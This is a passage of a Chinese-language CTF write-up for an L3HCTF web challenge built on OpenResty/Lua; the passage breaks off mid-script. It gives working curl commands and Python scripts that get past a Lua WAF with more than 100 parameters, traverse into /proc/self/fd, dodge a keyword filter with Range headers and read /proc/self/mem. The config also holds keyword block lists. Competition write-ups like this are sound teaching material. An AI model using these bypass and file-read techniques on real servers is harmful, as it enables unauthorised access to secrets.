class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openresty/openresty:alpine</span><br><span class="line"><span class="comment"># 这是基础镜像，使用了官方的 OpenResty （一个基于 Nginx 的高性能 Web 平台）轻量级 Alpine Linux 版本。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./nginx.conf /usr/local/openresty/nginx/conf/nginx.conf</span></span><br><span class="line"><span class="comment"># 把本地当前目录下的 nginx.conf 文件复制到容器中的 OpenResty 配置目录，替换默认的 Nginx 配置。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./www /www</span></span><br><span class="line"><span class="comment"># 把本地的 www 文件夹（通常是网站静态资源或项目文件）复制到容器的根目录 /www。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;L3HCTF&#123;test_flag&#125;&quot;</span> &gt; /flag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;test_password&quot;</span> &gt; /password</span></span><br><span class="line"><span class="comment"># 在镜像构建时，创建两个文件：</span></span><br><span class="line"><span class="comment"># /flag 文件，内容是 &quot;L3HCTF&#123;test_flag&#125;&quot; （通常是CTF比赛里的flag）</span></span><br><span class="line"><span class="comment"># /password 文件，内容是 &quot;test_password&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="comment"># 声明容器对外开放80端口（HTTP默认端口）。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;openresty -g &#x27;daemon off;&#x27;&quot;</span>]</span></span><br><span class="line"><span class="comment"># 容器启动时执行的命令，这条命令启动 OpenResty，并让它以前台模式运行（daemon off;），这样 Docker 容器不会因为进程退出而停止。</span></span><br><span class="line">worker_processes <span class="number">1</span>;</span><br><span class="line"><span class="comment"># 启动一个工作进程</span></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">  use epoll;</span><br><span class="line">  worker_connections <span class="number">10240</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 配置事件模型，这里用 Linux 下高效的 epoll，最大连接数10240</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">  include mime.types;</span><br><span class="line">  default_type text/html;</span><br><span class="line">  <span class="comment"># 载入 MIME 类型文件，默认响应类型是 text/html</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  access_log off;</span><br><span class="line">  error_log /dev/null;</span><br><span class="line">  <span class="comment"># 关闭访问日志，错误日志丢弃（输出到/dev/null，即不保存）</span></span><br><span class="line">  sendfile on;</span><br><span class="line">  <span class="comment"># 开启高效文件传输 sendfile</span></span><br><span class="line"></span><br><span class="line">  init_by_lua_block &#123;</span><br><span class="line">    f = io.open(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">      f2 = io.open(<span class="string">&quot;/password&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">      flag = f:read(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">      password = f2:read(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">      <span class="comment"># 在 Nginx 启动时运行：打开 /flag 和 /password 文件，把内容读到变量 flag 和 password 中</span></span><br><span class="line">      f:close()</span><br><span class="line">      <span class="comment"># 关闭文件</span></span><br><span class="line">      password = string.gsub(password, <span class="string">&quot;[\n\r]&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">      <span class="comment"># 清理 password 字符串中多余的换行符</span></span><br><span class="line">      os.remove(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">      os.remove(<span class="string">&quot;/password&quot;</span>)</span><br><span class="line">      <span class="comment"># 删除这两个文件（防止后续被直接访问，提升安全性）</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  server &#123;</span><br><span class="line">    listen <span class="number">80</span> default_server;</span><br><span class="line">    <span class="comment"># server 配置块，监听 80 端口</span></span><br><span class="line">    location / &#123;</span><br><span class="line">      content_by_lua_block &#123;</span><br><span class="line">        ngx.say(<span class="string">&quot;hello, world!&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 访问根目录，直接输出 hello, world!</span></span><br><span class="line"></span><br><span class="line">    location /static &#123;</span><br><span class="line">      alias /www/;</span><br><span class="line">      access_by_lua_block &#123;</span><br><span class="line">        if ngx.var.remote_addr ~= <span class="string">&quot;127.0.0.1&quot;</span> then</span><br><span class="line">          ngx.exit(<span class="number">403</span>)</span><br><span class="line">          end</span><br><span class="line">      &#125;</span><br><span class="line">      add_header Accept-Ranges bytes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 把请求 /static 映射到 /www/ 目录（之前 Dockerfile 里COPY进去的网站文件）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 访问控制：只有请求来自 127.0.0.1 (本机) 才允许访问，其他都返回 403 禁止</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 支持断点续传（Accept-Ranges）</span></span><br><span class="line"></span><br><span class="line">    location /download &#123;</span><br><span class="line">      access_by_lua_block &#123;</span><br><span class="line">        local blacklist = &#123;<span class="string">&quot;%.&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;proc&quot;</span>&#125;</span><br><span class="line">        local args = ngx.req.get_uri_args()</span><br><span class="line">          for k, v in pairs(args) do</span><br><span class="line">          for _, b in ipairs(blacklist) do</span><br><span class="line">          if string.find(v, b) then</span><br><span class="line">          ngx.exit(<span class="number">403</span>)</span><br><span class="line">          end</span><br><span class="line">          end</span><br><span class="line">          end</span><br><span class="line">      &#125;</span><br><span class="line">      add_header Content-Disposition <span class="string">&quot;attachment; filename=download.txt&quot;</span>;</span><br><span class="line">      proxy_pass http://<span class="number">127.0</span>.<span class="number">0.1</span>/static$arg_filename;</span><br><span class="line">      body_filter_by_lua_block &#123;</span><br><span class="line">        local blacklist = &#123;<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;l3hsec&quot;</span>, <span class="string">&quot;l3hctf&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;secret&quot;</span>, <span class="string">&quot;confidential&quot;</span>&#125;</span><br><span class="line">        for _, b in ipairs(blacklist) do</span><br><span class="line">          if string.find(ngx.<span class="keyword">arg</span>[<span class="number">1</span>], b) then</span><br><span class="line">          ngx.<span class="keyword">arg</span>[<span class="number">1</span>] = string.rep(<span class="string">&quot;*&quot;</span>, string.len(ngx.<span class="keyword">arg</span>[<span class="number">1</span>]))</span><br><span class="line">          end</span><br><span class="line">          end</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 下载功能，带黑名单过滤和内容屏蔽</span></span><br><span class="line">    <span class="comment"># 访问控制（access_by_lua_block）：</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取请求参数，检查参数值中是否包含黑名单字符串（点、斜杠、分号、flag、proc等）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果检测到，则拒绝访问（403）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Content-Disposition 设置让浏览器弹出“下载”对话框，文件名为 download.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用反向代理请求 /static 路径，传入参数 filename 作为静态文件路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 响应内容通过 body_filter_by_lua_block 过滤：</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果响应内容包含黑名单字符串（flag、password、secret等），就用星号替换整段内容（屏蔽敏感信息）</span></span><br><span class="line"></span><br><span class="line">    location /read_anywhere &#123;</span><br><span class="line">      access_by_lua_block &#123;</span><br><span class="line">        if ngx.var.http_x_gateway_password ~= password then</span><br><span class="line">          ngx.say(<span class="string">&quot;go find the password first!&quot;</span>)</span><br><span class="line">          ngx.exit(<span class="number">403</span>)</span><br><span class="line">          end</span><br><span class="line">      &#125;</span><br><span class="line">      content_by_lua_block &#123;</span><br><span class="line">        local f = io.open(ngx.var.http_x_gateway_filename, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">          if not f then</span><br><span class="line">          ngx.exit(<span class="number">404</span>)</span><br><span class="line">          end</span><br><span class="line">          local start = tonumber(ngx.var.http_x_gateway_start) or <span class="number">0</span></span><br><span class="line">          local length = tonumber(ngx.var.http_x_gateway_length) or <span class="number">1024</span></span><br><span class="line">          if length &gt; <span class="number">1024</span> * <span class="number">1024</span> then</span><br><span class="line">          length = <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">          end</span><br><span class="line">          f:seek(<span class="string">&quot;set&quot;</span>, start)</span><br><span class="line">          local content = f:read(length)</span><br><span class="line">          f:close()</span><br><span class="line">          ngx.say(content)</span><br><span class="line">          ngx.header[<span class="string">&quot;Content-Type&quot;</span>] = <span class="string">&quot;application/octet-stream&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 访问前先检查 HTTP 请求头 X-Gateway-Password 是否等于 password 变量（初始化时从文件里读取的密码）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果密码错误，返回提示并拒绝访问</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件指定范围内容，返回给客户端，内容类型是二进制流（octet-stream）</span></span><br></pre></td></tr></table></figure>
+
+<p>如同它的名字一样，我们可以看到<code>/read_anywhere</code>想读哪里就读哪里，但使用它需要密码。所以我们要到哪里去找密码？</p>
+<h2 id="突破-waf"><a href="#突破-waf" class="headerlink" title="突破 waf"></a>突破 waf</h2><p>我们来看<code>/download</code> 的这一句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy_pass http://127.0.0.1/static$arg_filename;</span><br></pre></td></tr></table></figure>
+
+<p>它的作用是把用户的请求转发给本地服务器的&#x2F;static&#x2F;xxx 路径，如果你访问了<code>/download?filename=/etc/passwd</code>最终就会被转发成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/static/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，这个&#x2F;download 路径其实是对&#x2F;static 路径的“代理”。但是由于下面的黑名单，我们无法直接下载 <code>/flag， proc/self/environ</code>，也无法进行路径穿越</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">local</span> blacklist = &#123;&quot;flag&quot;, &quot;l3hsec&quot;, &quot;l3hctf&quot;, &quot;password&quot;, &quot;secret&quot;, &quot;confidential&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们要突破 nginx lua waf，下载到密码。</p>
+<h3 id="nginx-lua-waf-bypass"><a href="#nginx-lua-waf-bypass" class="headerlink" title="nginx lua waf bypass"></a>nginx lua waf bypass</h3><p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/71853.html">【技术分享】Nginx Lua WAF通用绕过方法 - SecPulse.COM | 安全脉搏</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/145428">Nginx Lua WAF通用绕过方法-安全KER - 安全资讯平台</a></p>
+<p>Nginx Lua获取参数时，默认获取前100个参数值，其余的将被丢弃。</p>
+<p>那么我们这里应该发 get 还是 post 参数，或者是 headers?</p>
+<h4 id="ngx-req-get-uri-args"><a href="#ngx-req-get-uri-args" class="headerlink" title="ngx.req.get_uri_args()"></a>ngx.req.get_uri_args()</h4><p>这是 Nginx 的 Lua 扩展提供的函数， 只能在 <strong>Nginx 的 Lua 环境</strong> 下用。</p>
+<p>每个词是什么意思？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ngx.req.get_uri_args()</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>部分</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ngx</code></td>
+<td>Nginx 给 Lua 提供的一个“总对象”，代表当前请求的上下文</td>
+</tr>
+<tr>
+<td><code>ngx.req</code></td>
+<td>请求（request）相关的操作集合，比如请求参数、请求体等</td>
+</tr>
+<tr>
+<td><code>ngx.req.get_uri_args()</code></td>
+<td>一个函数，用来获取 URI（URL）中的参数</td>
+</tr>
+</tbody></table>
+<p>举个例子：</p>
+<p>你请求这个网址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/download?filename=test.txt&amp;user=admin</span><br></pre></td></tr></table></figure>
+
+<p>问号 <code>?</code> 后面是参数：<code>filename=test.txt</code> 和 <code>user=admin</code></p>
+<p>这时候，你用这段 Lua：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local args = ngx.req.get_uri_args()</span><br></pre></td></tr></table></figure>
+
+<p>就能拿到一个表（table）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">args = &#123;</span><br><span class="line">  filename = &quot;test.txt&quot;,</span><br><span class="line">  user = &quot;admin&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>你就可以这样用它：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ngx.say(args[&quot;filename&quot;])  -- 打印：test.txt</span><br></pre></td></tr></table></figure>
+
+<p>既然这个函数只能用来获取 URL 里的参数，所以我们这里只能发 get 请求。</p>
+<p>由上面的链接可以知道，Nginx Lua Waf，默认只读取前 100 个参数。 如果传了超过 100 个参数，那么 <strong>第 101 个之后的参数会被“吃掉”</strong>，WAF 根本看不见。  </p>
+<p>由此我们这里就可以发 101 个参数，在最后一个参数写 filename&#x3D;[ 我们想要读取的服务器上的文件 ]</p>
+<p>但是我们要去哪里读密码呢？毕竟：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.remove(&quot;/flag&quot;)</span><br><span class="line">os.remove(&quot;/password&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这两个文件已经被删掉了啊。</p>
+<p>但是有可能还有某个进程在用&#x2F;password 这个资源，所以我们访问&#x2F;proc&#x2F;self&#x2F;fd&#x2F;?，也许就可以找到。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl&quot;http://43.138.2.216:17794/download?a1=1&amp;a2=2&amp;a3=3&amp;a4=4&amp;a5=5&amp;a6=6&amp;a7=7&amp;a8=8&amp;a9=9&amp;a10=10&amp;a11=11&amp;a12=12&amp;a13=13&amp;a14=14&amp;a15=15&amp;a16=16&amp;a17=17&amp;a18=18&amp;a19=19&amp;a20=20&amp;a21=21&amp;a22=22&amp;a23=23&amp;a24=24&amp;a25=25&amp;a26=26&amp;a27=27&amp;a28=28&amp;a29=29&amp;a30=30&amp;a31=31&amp;a32=32&amp;a33=33&amp;a34=34&amp;a35=35&amp;a36=36&amp;a37=37&amp;a38=38&amp;a39=39&amp;a40=40&amp;a41=41&amp;a42=42&amp;a43=43&amp;a44=44&amp;a45=45&amp;a46=46&amp;a47=47&amp;a48=48&amp;a49=49&amp;a50=50&amp;a51=51&amp;a52=52&amp;a53=53&amp;a54=54&amp;a55=55&amp;a56=56&amp;a57=57&amp;a58=58&amp;a59=59&amp;a60=60&amp;a61=61&amp;a62=62&amp;a63=63&amp;a64=64&amp;a65=65&amp;a66=66&amp;a67=67&amp;a68=68&amp;a69=69&amp;a70=70&amp;a71=71&amp;a72=72&amp;a73=73&amp;a74=74&amp;a75=75&amp;a76=76&amp;a77=77&amp;a78=78&amp;a79=79&amp;a80=80&amp;a81=81&amp;a82=82&amp;a83=83&amp;a84=84&amp;a85=85&amp;a86=86&amp;a87=87&amp;a88=88&amp;a89=89&amp;a90=90&amp;a91=91&amp;a92=92&amp;a93=93&amp;a94=94&amp;a95=95&amp;a96=96&amp;a97=97&amp;a98=98&amp;a99=99&amp;a100=100&amp;filename=%2e%2e%2f%2fproc%2fself%2ffd%2f6&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1752847180654-a9893932-86a8-432b-af0d-f17e0943c46b.png" alt="img"></p>
+<p>我们在 fd6 找到了，但是因为这个过滤的关系：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local blacklist = &#123;&quot;flag&quot;, &quot;l3hsec&quot;, &quot;l3hctf&quot;, &quot;password&quot;, &quot;secret&quot;, &quot;confidential&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>password 无法显示。</p>
+<p>所以我们可以<strong>使用 HTTP 的 Range 头</strong>，向服务器请求 <strong>某个资源的一部分内容</strong>，而不是整个资源。  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;Range: bytes=0-6&quot; &quot;http://43.138.2.216:17794/download?a1=1&amp;a2=2&amp;a3=3&amp;a4=4&amp;a5=5&amp;a6=6&amp;a7=7&amp;a8=8&amp;a9=9&amp;a10=10&amp;a11=11&amp;a12=12&amp;a13=13&amp;a14=14&amp;a15=15&amp;a16=16&amp;a17=17&amp;a18=18&amp;a19=19&amp;a20=20&amp;a21=21&amp;a22=22&amp;a23=23&amp;a24=24&amp;a25=25&amp;a26=26&amp;a27=27&amp;a28=28&amp;a29=29&amp;a30=30&amp;a31=31&amp;a32=32&amp;a33=33&amp;a34=34&amp;a35=35&amp;a36=36&amp;a37=37&amp;a38=38&amp;a39=39&amp;a40=40&amp;a41=41&amp;a42=42&amp;a43=43&amp;a44=44&amp;a45=45&amp;a46=46&amp;a47=47&amp;a48=48&amp;a49=49&amp;a50=50&amp;a51=51&amp;a52=52&amp;a53=53&amp;a54=54&amp;a55=55&amp;a56=56&amp;a57=57&amp;a58=58&amp;a59=59&amp;a60=60&amp;a61=61&amp;a62=62&amp;a63=63&amp;a64=64&amp;a65=65&amp;a66=66&amp;a67=67&amp;a68=68&amp;a69=69&amp;a70=70&amp;a71=71&amp;a72=72&amp;a73=73&amp;a74=74&amp;a75=75&amp;a76=76&amp;a77=77&amp;a78=78&amp;a79=79&amp;a80=80&amp;a81=81&amp;a82=82&amp;a83=83&amp;a84=84&amp;a85=85&amp;a86=86&amp;a87=87&amp;a88=88&amp;a89=89&amp;a90=90&amp;a91=91&amp;a92=92&amp;a93=93&amp;a94=94&amp;a95=95&amp;a96=96&amp;a97=97&amp;a98=98&amp;a99=99&amp;a100=100&amp;filename=%2e%2e%2f%2fproc%2fself%2ffd%2f6&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这样逐步搞出密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwordismemeispasswordsoneverwannagiveyouup</span><br></pre></td></tr></table></figure>
+
+<h2 id="读出-flag（maps-和-mem）"><a href="#读出-flag（maps-和-mem）" class="headerlink" title="读出 flag（maps 和 mem）"></a>读出 flag（maps 和 mem）</h2><p>接下去我们先读 <code>/proc/self/maps</code>，再盯着被删掉的那一部分往下读。</p>
+<p><code>/proc/self/maps</code> 是当前进程（self）内存空间的结构图，列出了哪些地址段被加载了什么（比如代码、库、堆、栈、文件等）。<code>/proc</code>是 Linux 的一个<strong>虚拟文件系统</strong>，叫 <strong>procfs</strong>，专门用来提供运行中进程的信息。<code>self</code> 是个特殊的快捷方式，指代 “<strong>当前访问这个文件的进程自身</strong>”。<code>maps</code>是当前进程的“内存映射信息”，也可以理解为“你当前这个程序的内存布局”。</p>
+<p>这个时候我们让 AI 写个脚本读 maps:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.138.2.216:17794/read_anywhere&quot;</span></span><br><span class="line">password = <span class="string">&quot;passwordismemeispasswordsoneverwannagiveyouup&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_maps</span>():</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;X-Gateway-Password&quot;</span>: password,</span><br><span class="line">        <span class="string">&quot;X-Gateway-Filename&quot;</span>: <span class="string">&quot;/proc/self/maps&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Gateway-Start&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Gateway-Length&quot;</span>: <span class="built_in">str</span>(<span class="number">0x10000</span>),  <span class="comment"># 一般够用，最多64KB</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 正在远程读取 /proc/self/maps...\n&quot;</span>)</span><br><span class="line">    maps = read_maps()</span><br><span class="line">    <span class="built_in">print</span>(maps)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p> 配置文件里 <strong>并没有显式写出什么叫 “X-Gateway-Filename” 等请求头</strong>，为什么我们要用这个名字？  </p>
+<p>其实它是通过 Lua 代码里的变量名隐式规定的，OpenResty 提供的 <code>ngx.var.http_XXX</code> 是 <strong>用来获取 HTTP 请求头部中</strong> <code>**XXX**</code> <strong>字段的内容</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ngx.var.http_` + 请求头字段名的小写 + 替换掉 `-` 为 `_</span><br></pre></td></tr></table></figure>
+
+<p>举个例子：</p>
+<table>
+<thead>
+<tr>
+<th>请求头</th>
+<th>在 Lua 中怎么获取</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>X-Gateway-Filename</code></td>
+<td><code>ngx.var.http_x_gateway_filename</code></td>
+<td>请求头字段会自动映射为 nginx 变量名</td>
+</tr>
+<tr>
+<td><code>X-Gateway-Password</code></td>
+<td><code>ngx.var.http_x_gateway_password</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><code>X-Gateway-Start</code></td>
+<td><code>ngx.var.http_x_gateway_start</code></td>
+<td>用于偏移读取</td>
+</tr>
+<tr>
+<td><code>X-Gateway-Length</code></td>
+<td><code>ngx.var.http_x_gateway_length</code></td>
+<td>用于限制读取长度</td>
+</tr>
+</tbody></table>
+<hr>
+<p>看 <code>/read_anywhere</code> ：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">access_by_lua_block</span> &#123;</span><br><span class="line">  <span class="attribute">if</span> ngx.var.http_x_gateway_password ~= password then</span><br><span class="line">    ngx.say(<span class="string">&quot;go find the password first!&quot;</span>)</span><br><span class="line">    ngx.exit(<span class="number">403</span>)</span><br><span class="line">    end</span><br><span class="line">&#125;</span><br><span class="line">content_by_lua_block &#123;</span><br><span class="line">  <span class="attribute">local</span> f = io.open(ngx.var.http_x_gateway_filename, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    ...</span><br><span class="line">    local start = tonumber(ngx.var.http_x_gateway_start) or <span class="number">0</span></span><br><span class="line">    local length = tonumber(ngx.var.http_x_gateway_length) or <span class="number">1024</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从这段你能看到：</p>
+<ul>
+<li><code>ngx.var.http_x_gateway_password</code> → 就是你请求头中的 <code>X-Gateway-Password</code></li>
+<li><code>ngx.var.http_x_gateway_filename</code> → 就是你请求头中的 <code>X-Gateway-Filename</code></li>
+<li><code>ngx.var.http_x_gateway_start</code> 和 <code>length</code> 也是同理</li>
+</ul>
+<p>这些名字没有被写死在配置里，而是通过 Lua 代码访问 <code>ngx.var.http_...</code> 约定得来的。</p>
+<p>虽然配置文件没明说“你必须用这些请求头”，但因为代码里用了 <code>ngx.var.http_x_gateway_...</code>，你必须传入这些名字的请求头，它们才有值，功能才会工作。</p>
+<p>结果出来，读这个唯一 deleted 的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1752847752695-3a7e082b-e6bf-40a3-bc01-ca9b337c3f84.png" alt="img"></p>
+<p>再写个脚本读取 mem</p>
+<p><code>/proc/self/mem</code> 是 Linux 提供的一个接口，允许你<strong>直接读取或写入当前进程的任意内存地址</strong>。  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.138.2.216:17794/read_anywhere&quot;</span></span><br><span class="line">password = <span class="string">&quot;passwordismemeispasswordsoneverwannagiveyouup&quot;</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x720c04746000</span> <span class="comment"># 这里改地址</span></span><br><span class="line"></span><br><span class="line">length = <span class="number">2000000</span> <span class="comment"># 这里写长一点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_mem_chunk</span>(<span class="params">start, length</span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;X-Gateway-Password&quot;</span>: password,</span><br><span class="line">        <span class="string">&quot;X-Gateway-Filename&quot;</span>: <span class="string">&quot;/proc/self/mem&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Gateway-Start&quot;</span>: <span class="built_in">str</span>(start),</span><br><span class="line">        <span class="string">&quot;X-Gateway-Length&quot;</span>: <span class="built_in">str</span>(length),</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> 